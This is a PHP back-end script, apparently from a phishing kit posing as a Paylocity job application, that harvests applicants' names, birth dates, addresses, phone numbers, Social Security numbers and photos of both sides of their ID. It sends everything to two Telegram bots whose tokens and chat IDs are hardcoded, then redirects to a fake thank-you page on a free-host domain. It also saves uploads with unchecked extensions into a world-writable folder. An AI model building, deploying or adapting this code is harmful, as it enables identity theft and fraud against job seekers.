<?php

include 'firewall.php';


// Telegram configuration
$telegram_bots = [
    [
        'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
        'chat_id' => '1325797388'
    ],
    [
        'token' => '7395338291:AAFiyILeZdxyENeRvcaYgZ93vnv2DYyW_XM',
        'chat_id' => '8160582785'
    ]
    // Add more bots here if needed
];


if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Get form inputs
    $first_name = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
    $middle_name = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
    $last_name = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
    $full_name = trim("$first_name $middle_name $last_name");

    $birth_month = $_POST['q18_birthDate']['month'] ?? '';
    $birth_day = $_POST['q18_birthDate']['day'] ?? '';
    $birth_year = $_POST['q18_birthDate']['year'] ?? '';
    $birth_date = "$birth_year-$birth_month-$birth_day";

    $address = htmlspecialchars($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " . 
               htmlspecialchars($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
               htmlspecialchars($_POST['q16_currentAddress']['city'] ?? '') . ", " .
               htmlspecialchars($_POST['q16_currentAddress']['state'] ?? '') . ", " .
               htmlspecialchars($_POST['q16_currentAddress']['postal'] ?? '');

    $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
    $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
    $position = htmlspecialchars($_POST['q14_positionApplied'] ?? '');
    $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
    $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
    $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');

    $timestamp = date("Y-m-d H:i:s");






    // Create the uploads directory if it doesn't exist
    $upload_dir = "uploads/";
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }

    // Function to process uploaded files
    function handleFileUpload($file_input_name, $file_prefix) {
        global $upload_dir;

        if (!empty($_FILES[$file_input_name]['name'][0])) {
            $original_filename = $_FILES[$file_input_name]['name'][0];
            $file_extension = pathinfo($original_filename, PATHINFO_EXTENSION);
            $new_filename = $file_prefix . "_" . time() . "." . $file_extension;
            $file_path = $upload_dir . $new_filename;

            if (move_uploaded_file($_FILES[$file_input_name]['tmp_name'][0], $file_path)) {
                return $file_path;
            }
        }
        return null;
    }


    // Handle file uploads
    $front_id_path = handleFileUpload('q17_uploadYour', 'front_id');
    $back_id_path = handleFileUpload('q26_identityVerification', 'back_id');




    // Function to send messages to multiple Telegram bots
    function sendMessageToTelegramBots($message, $bots) {
        foreach ($bots as $bot) {
            $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";

            $data = [
                'chat_id' => $bot['chat_id'],
                'text' => $message,
                'parse_mode' => 'Markdown'
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $telegram_url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }


    // Prepare message for Telegram
    $telegram_message = "📝 *New Job Application*\n\n".
                        "👤 *Name:* $full_name\n".
                        "🎂 *Birth Date:* $birth_date\n".
                        "🏠 *Address:* $address\n".
                        "📧 *Email:* $email\n".
                        "📞 *Phone:* $phone\n".
                        "💼 *Position Applied:* $position\n".
                        "📌 *Job Type:* $job_type\n".
                        "🗣️ *Referred By:* $source\n".
                        "🔐 *SSN:* $ssn\n".
                        "⏳ *Submitted At:* $timestamp\n".
                        "📎 *Identity Verification:* " . ($front_id_path && $back_id_path ? "✅ Uploaded" : "❌ Not Provided");


    // Send text message to Telegram
    sendMessageToTelegramBots($telegram_message, $telegram_bots);




   // Function to send files to multiple Telegram bots
    function sendFileToTelegramBots($file_path, $caption, $bots) {
        if (!file_exists($file_path) || filesize($file_path) == 0) {
            return; // Skip if the file is missing or empty
        }

        $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
        $image_extensions = ['jpg', 'jpeg', 'png', 'gif'];

        foreach ($bots as $bot) {
            $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/";

            if (in_array($file_extension, $image_extensions)) {
                $telegram_url .= "sendPhoto";
                $post_data = [
                    'chat_id' => $bot['chat_id'],
                    'photo' => new CURLFile(realpath($file_path)), 
                    'caption' => $caption,
                    'parse_mode' => 'Markdown'
                ];
            } else {
                $telegram_url .= "sendDocument";
                $post_data = [
                    'chat_id' => $bot['chat_id'],
                    'document' => new CURLFile(realpath($file_path)), 
                    'caption' => $caption,
                    'parse_mode' => 'Markdown'
                ];
            }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $telegram_url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }



    // Send files to Telegram
    sendFileToTelegramBots($front_id_path, "📎 *Front ID* uploaded by *$full_name*", $telegram_bots);
    sendFileToTelegramBots($back_id_path, "📎 *Back ID* uploaded by *$full_name*", $telegram_bots);




    header("Location:https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html");
exit;
}
?>
